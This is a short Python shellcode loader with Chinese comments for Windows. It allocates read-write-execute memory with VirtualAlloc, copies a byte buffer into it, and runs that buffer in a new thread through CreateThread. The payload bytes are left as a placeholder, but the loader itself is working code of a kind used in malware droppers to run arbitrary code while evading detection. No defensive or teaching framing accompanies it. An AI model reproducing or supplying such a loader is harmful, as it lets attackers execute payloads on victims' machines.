import ctypes
import win32event

def run_shellcode(shellcode):
    #申请内存属于64位
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    #申请一块内存空间
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
    # 往内存空间里写入shellcode
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
    # 创建线程
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    # 创建事件对象
    event = win32event.CreateEvent(None, False, False, None)
    # 等待线程结束或事件触发
    win32event.WaitForSingleObject(event, -1)


buf = b'...'
run_shellcode(buf)